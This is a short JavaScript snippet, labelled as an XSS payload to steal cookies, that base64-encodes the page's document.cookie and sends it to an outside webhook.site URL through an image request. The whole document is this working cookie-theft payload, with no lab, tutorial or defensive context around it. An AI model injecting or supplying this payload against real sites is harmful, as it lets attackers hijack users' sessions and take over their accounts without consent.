// XSS Payload to steal cookies
var img = new Image();
img.src = 'https://webhook.site/1e196f58-06fb-4973-a3a8-730f20e3b5fc?data=' + btoa(document.cookie);
